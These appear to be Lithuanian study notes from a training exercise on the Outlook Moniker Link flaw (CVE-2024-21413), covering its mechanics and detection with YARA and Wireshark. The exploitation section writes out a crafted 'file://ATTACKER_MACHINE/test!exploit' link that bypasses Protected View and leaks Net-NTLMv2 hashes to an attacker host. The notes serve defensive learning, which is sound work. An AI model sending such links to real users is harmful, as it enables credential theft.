### INTRO ###

#Moniker Link (CVE-2024-21413)#

CVE-2024-21413 yra kritine MICROSOFT OUTLOOK pazeidziamybe, leidziati apieti outlook apsaugas per specilai suformuota hyperlinka, vadinama MONIKER LINK

Esme:
Uzpuolikas gali isiusti aukai email su malicious Moniker link. 
Jei auka paspaudzia toki linka, outlook gali:
* Neteisingai apdoroti nuoroda
* apeiti dali savo securitu mechanizmu
* ir sukelti credential leak

Svarbi sito intro dalis
Tai nera tiesiog:
* Pprastas phising linkas,
* ar attachment malware

Tay yra:
* outlook hyperlink handling vulnerability
* pristatoma per email
* su pagrindine praktine pasekme sitoje temoje: credentials leak

Rizikos lygis
* Severity: Critical
* Attack Complexity: Low
* Score: 9.8

Tai rodo kad bugas laikomas labai rimtu ir lengviau isnaudojamu nei daugelis kitu client side problemu

___________________________________________________________________________
### Explotation ###

# Monker Link / CVE-2024-21413 mechanika # 

Outlook gali renderinti emailus kaip HTML, todel laiske gali buti hyperlinkai.Sioje pazeidziamybeje isnaudojamas specialiai suformuotas <file://> hyperlinkas, kuris apeina outlook *protected view* ir privercia windows bandyti SMB autentikacija i attackerio hosta. 

*Normalus elgesys* 
Jei laiske yra paprastas <file://> linkas pvz:
`<a href="file://ATTACKER_MACHINE/test">Click me</a>`
Outlook turetu:
* padaryti securiy warning
* arba blokuoti veiksma per *protected view* 

*Vulnerable elgesys* 
Jei hyperlinkas modifikuojamas taip:
`<a href="file://ATTACKER_MACHINE/test!exploit">Click me</a>`
tada:
* Outlook neteisingai apdoroja linka
* protected view apeinama
* windows pabando jungtis prie attackerio host per smb
*Pasekme*
SMB autentikacijos metu Windows gali nususti:
* Net-NTLMv2 authentication data/ hash

Tai leidzia attackeriui pagauti aukos Net-NTLMv2 hash.

# Svarbios pastabos # 
* Share nebutinai turi realiai egzistuoti
* uztenka autentikacijos bandymo
* useriui nereikia ranka ivesti psw
* pagrindinis praktinis sios temos impact: *Net-NTLMv2 hash capture / credential leak*

__________________________________________________________________________________

### Detection ###

# YARA # 
YARA taisykle naudojama aptikti emailams, kuriuose yra pozymiu, susijusiu *CVE-2024-21413 exploit bandymu * 
*KA TIKRINA TAISUKLE*
Ji iesko:
* emailui budingu lauku:
	* Subject :
	* Received :
* Ir tikrina hyer link paterna susijusi su :
	* <file://>
	* network path / UNC keliu
	* failo tipu
	* SVARBIAUSIA DETALE *!* 

Esme
YARA taisykle bando aptikti *specialiai crafted Moniker LInk eail turiny* 
Svarbiausias pozymis sitos CVE kontekste:
* ne seip <file://>
* o <file://...!>
Nes butent tas modifikuotas formatas siejamas su *Protected view bypass*

Ka tai reiskia:
YARA cia aptinka:
* galima exploit payloada emaile
* t.y. pacia itartina zinute/artefakta

# Wireshark/packet capture detection # 
Kai auka paspaudzia crafted Moniker link:
* windows gali pradeti SMB rysi i attackerio hosta
* ivyksta *NTLM autentikacijos bandymas*
Todel packet capture galima pamatyti:
* SMB srauta
* NTLM autentikacijos aktyvuma
* ir siame kambaryje minima, kad matomas *truncated Net-NTLMv2 hash*

Esme
Wireshark cia rodo ne pati email payloada o :
* jo pasekme tinkle
Kitaip tariant:
* Yara = ziuri i itartina email
* wireshark = ziuri kas ivyko po paspaudimo

# Svarbiausias skirtumas # 

*YARA*
Aptinka:
* email turini 
* exploit patterna
* crafted <file://!> linka

*Wireshark*
Aptinka:
* SMB.NTLM aktyvuma
* bandyma autentikuotis i attackerio hosta
* galima Net-NTLMv2 hash leakage pozymi


_______________________________________________________________________________


